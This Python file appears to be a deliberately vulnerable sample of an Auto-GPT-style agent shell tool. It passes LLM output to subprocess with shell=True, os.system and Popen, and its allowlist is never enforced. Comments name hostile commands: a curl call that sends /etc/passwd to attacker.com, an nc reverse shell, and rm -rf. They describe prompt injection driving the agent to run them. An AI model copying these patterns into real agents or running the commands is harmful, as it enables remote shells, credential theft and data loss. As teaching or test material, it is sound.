"""
Auto-GPT Style Shell Command Executor
Pattern: Early Auto-GPT and fork implementations

This module implements a tool that executes shell commands as part of
an AI agent's action repertoire.

VULNERABILITY: Uses subprocess with shell=True on agent-generated commands.
This is the same pattern that was present in early Auto-GPT versions,
allowing arbitrary command execution based on LLM output.
"""
from __future__ import annotations

import subprocess
import shlex
from typing import Optional


class CommandResult:
    """Result of a command execution."""

    def __init__(self, stdout: str, stderr: str, return_code: int):
        self.stdout = stdout
        self.stderr = stderr
        self.return_code = return_code
        self.success = return_code == 0


def execute_shell_command(command: str, timeout: int = 60) -> CommandResult:
    """Execute a shell command and return the result.

    This function is called by the agent when it decides to run a command.
    The command string comes from the LLM's decision-making process.

    Args:
        command: The shell command to execute (from LLM output).
        timeout: Maximum execution time in seconds.

    Returns:
        CommandResult with stdout, stderr, and return code.

    WARNING: This function is DANGEROUS as it allows arbitrary
    command execution based on LLM output.
    """
    try:
        # VULNERABILITY: subprocess with shell=True on untrusted input
        # An attacker can use prompt injection to make the agent run:
        #   rm -rf /
        #   curl attacker.com/exfil?data=$(cat /etc/passwd)
        #   nc attacker.com 4444 -e /bin/sh
        result = subprocess.run(
            command,  # ← SINK: command from LLM
            shell=True,  # ← DANGEROUS: enables shell interpretation
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return CommandResult(
            stdout=result.stdout,
            stderr=result.stderr,
            return_code=result.returncode,
        )
    except subprocess.TimeoutExpired:
        return CommandResult(
            stdout="",
            stderr=f"Command timed out after {timeout} seconds",
            return_code=-1,
        )
    except Exception as e:
        return CommandResult(
            stdout="",
            stderr=f"Command execution failed: {str(e)}",
            return_code=-1,
        )


class ShellTool:
    """Tool for executing shell commands in an agent context.

    This is a typical implementation pattern seen in AI agent frameworks
    that need to interact with the operating system.
    """

    name: str = "shell"
    description: str = """Execute a shell command on the system.
Use this when you need to:
- Run system utilities
- Manage files
- Execute programs
- Check system status

Input: The shell command to execute.
Output: stdout, stderr, and return code.
"""

    def __init__(self, allowed_commands: Optional[list] = None):
        """Initialize the shell tool.

        Args:
            allowed_commands: If provided, only these commands are allowed.
                             Currently not enforced (vulnerability).
        """
        self.allowed_commands = allowed_commands

    def run(self, command: str) -> str:
        """Execute a command.

        Args:
            command: Shell command from agent/LLM.

        Returns:
            Command output or error message.
        """
        # NOTE: allowed_commands check is not actually enforced
        # This is a common mistake - having a safeguard that doesn't work

        result = execute_shell_command(command)

        if result.success:
            return result.stdout if result.stdout else "Command executed successfully"
        else:
            return f"Error (code {result.return_code}): {result.stderr}"


# Alternative dangerous pattern: using os.system
def execute_with_os_system(command: str) -> int:
    """Execute command using os.system (even more dangerous).

    This pattern is seen in simpler agent implementations.
    os.system() directly invokes the shell with no output capture.
    """
    import os

    # VULNERABILITY: os.system with shell command
    return os.system(command)


# Another dangerous pattern: Popen with shell=True
def execute_with_popen(command: str) -> str:
    """Execute command using Popen with shell=True."""
    # VULNERABILITY: Popen with shell=True
    proc = subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    stdout, stderr = proc.communicate()
    return stdout


if __name__ == "__main__":
    # Example usage (demonstrates the vulnerability)
    tool = ShellTool()

    # Benign command
    print("Running 'whoami':")
    print(tool.run("whoami"))

    # If the LLM decides to run this (through prompt injection):
    # print(tool.run("cat /etc/passwd"))  # Data exfiltration
    # print(tool.run("rm -rf important_data/"))  # Destructive
